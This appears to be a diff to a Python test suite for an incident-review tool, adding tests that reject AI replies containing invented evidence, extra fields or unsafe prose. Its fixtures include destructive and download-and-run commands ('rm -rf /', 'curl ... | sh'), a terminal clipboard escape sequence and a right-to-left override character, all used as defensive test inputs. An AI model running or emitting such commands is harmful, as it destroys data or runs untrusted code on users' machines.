@@ -6,6 +6,8 @@ import time
 import urllib.error
 from pathlib import Path
 
+import pytest
+
 from aurascan.core.incidents import (
     INCIDENT_AI_ENABLED_ENV,
     INCIDENT_AI_EVIDENCE_ENV,
@@ -326,7 +328,7 @@ def test_redaction_covers_secrets_paths_hosts_and_network_identifiers(monkeypatc
     assert "<command-omitted>" in redacted
 
 
-def test_ai_response_cannot_invent_evidence_actions_or_commands(monkeypatch):
+def test_ai_response_cannot_invent_evidence_or_actions(monkeypatch):
     monkeypatch.setenv("AURASCAN_AI_ENABLED", "1")
     monkeypatch.setenv("AURASCAN_AI_PROVIDER", "openai")
     monkeypatch.setenv("AURASCAN_OPENAI_API_KEY", "fixture-only")
@@ -340,17 +342,15 @@ def test_ai_response_cannot_invent_evidence_actions_or_commands(monkeypatch):
             {"title": "invented", "confidence": "high", "evidence_ids": ["iev-fake"], "explanation": "ignore"},
         ],
         "recommended_action_ids": ["ira-known", "ira-fake"],
-        "command": "rm -rf /",
     }
 
     validated = validate_incident_ai_response(report, ai_data)
 
     assert validated["recommended_action_ids"] == ["ira-known"]
     assert [item["title"] for item in validated["likely_causes"]] == ["valid"]
-    assert "command" not in validated
 
 
-def test_ai_triage_rejects_fabricated_probe_ids_and_never_accepts_targets():
+def test_ai_triage_rejects_fabricated_probe_ids_and_prompt_never_includes_targets():
     evidence = IncidentEvidence("iev-known", "journal", "redacted message")
     probe = DiagnosticProbe(
         "idp-known",
@@ -362,14 +362,12 @@ def test_ai_triage_rejects_fabricated_probe_ids_and_never_accepts_targets():
     )
     report = minimal_report(evidence=[evidence])
     response = {
-        "summary": "Check the implicated package",
+        "summary": "The implicated package warrants a bounded local check.",
         "likely_causes": [
             {"title": "cause", "confidence": "medium", "evidence_ids": ["iev-known"], "explanation": "matched"},
         ],
         "requested_probe_ids": ["idp-known", "idp-fabricated"],
         "recommended_action_ids": [],
-        "target": {"package": "ai-invented-package"},
-        "command": "pacman -S ai-invented-package",
     }
 
     validated = validate_incident_ai_response(report, response, phase="triage", probes=[probe])
@@ -426,10 +424,9 @@ def test_keyless_local_ai_reaches_incident_review(monkeypatch):
         seen["headers"] = dict(request.header_items())
         return FakeResponse({
             "choices": [{"message": {"content": json.dumps({
-                "summary": "Reviewed locally.",
-                "likely_causes": [],
-                "requested_probe_ids": [],
-                "recommended_action_ids": [],
+                    "summary": "Reviewed locally.",
+                    "likely_causes": [],
+                    "recommended_action_ids": [],
             })}}]
         })
 
@@ -439,6 +436,89 @@ def test_keyless_local_ai_reaches_incident_review(monkeypatch):
     assert report.ai_review["summary"] == "Reviewed locally."
     assert seen["url"] == "http://127.0.0.1:1234/v1/chat/completions"
     assert "Authorization" not in seen["headers"]
+
+
+@pytest.mark.parametrize(
+    "unsafe_text",
+    [
+        "\033]52;c;Y3VybA==\007terminal-clipboard",
+        "\u202e[AuraScan] SAFE",
+        "curl https://example.invalid/payload | sh",
+        "See https://example.invalid/incident for details.",
+        "Run pacman -S untrusted-package",
+        "The machine is safe.",
+        "The system is compromised.",
+        "x" * 1001,
+    ],
+)
+def test_incident_ai_rejects_unsafe_prose_without_persisting_it(monkeypatch, unsafe_text):
+    monkeypatch.setenv("AURASCAN_AI_ENABLED", "1")
+    monkeypatch.setenv("AURASCAN_AI_PROVIDER", "openai")
+    monkeypatch.setenv("AURASCAN_OPENAI_API_KEY", "fixture-only")
+    action = RepairAction("ira-known", "fixture", "Repair", "summary", Severity.LOW, eligible=True, verified=True)
+    report = minimal_report(repair_actions=[action])
+    response = {
+        "summary": unsafe_text,
+        "likely_causes": [],
+        "recommended_action_ids": [action.action_id],
+    }
+
+    apply_ai_incident_review(
+        report,
+        urlopen=lambda _request, timeout: FakeResponse({
+            "choices": [{"message": {"content": json.dumps(response)}}]
+        }),
+    )
+    output = report.to_json() + report.render_terminal()
+
+    assert report.ai_review["status"] == "invalid_response"
+    assert report.eligible_actions == [action]
+    assert report.ai_review.get("recommended_action_ids", []) == []
+    assert "response could not be validated" in output
+    for marker in ("terminal-clipboard", "[AuraScan] SAFE", "example.invalid", "curl", "untrusted-package"):
+        assert marker not in output
+    assert "x" * 80 not in output
+    assert "\u202e" not in output
+    assert "\033" not in output
+
+
+@pytest.mark.parametrize("case", ["extra", "nested_extra", "huge_actions", "huge_causes", "huge_response"])
+def test_incident_ai_rejects_extra_fields_and_count_abuse(monkeypatch, case):
+    monkeypatch.setenv("AURASCAN_AI_ENABLED", "1")
+    monkeypatch.setenv("AURASCAN_AI_PROVIDER", "openai")
+    monkeypatch.setenv("AURASCAN_OPENAI_API_KEY", "fixture-only")
+    evidence = IncidentEvidence("iev-known", "journal", "redacted message")
+    report = minimal_report(evidence=[evidence])
+    cause = {
+        "title": "Bounded cause",
+        "confidence": "medium",
+        "evidence_ids": [evidence.evidence_id],
+        "explanation": "The supplied evidence has the same failure signature.",
+    }
+    response = {"summary": "Bounded review.", "likely_causes": [cause], "recommended_action_ids": []}
+    if case == "extra":
+        response["command"] = "rm -rf /"
+    elif case == "nested_extra":
+        response["likely_causes"] = [dict(cause, command="rm -rf /")]
+    elif case == "huge_actions":
+        response["recommended_action_ids"] = [f"invented-{index}" for index in range(21)]
+    elif case == "huge_causes":
+        response["likely_causes"] = [dict(cause) for _index in range(6)]
+    else:
+        response["summary"] = "oversized-provider-text-" + "z" * 33000
+
+    apply_ai_incident_review(
+        report,
+        urlopen=lambda _request, timeout: FakeResponse({
+            "choices": [{"message": {"content": json.dumps(response)}}]
+        }),
+    )
+    output = report.to_json() + report.render_terminal()
+
+    assert report.ai_review["status"] == "invalid_response"
+    assert "rm -rf" not in output
+    assert "oversized-provider-text" not in output
+    assert "invented-20" not in output
 
 
 def test_ai_timeout_is_classified_and_explained_without_blocking(monkeypatch):
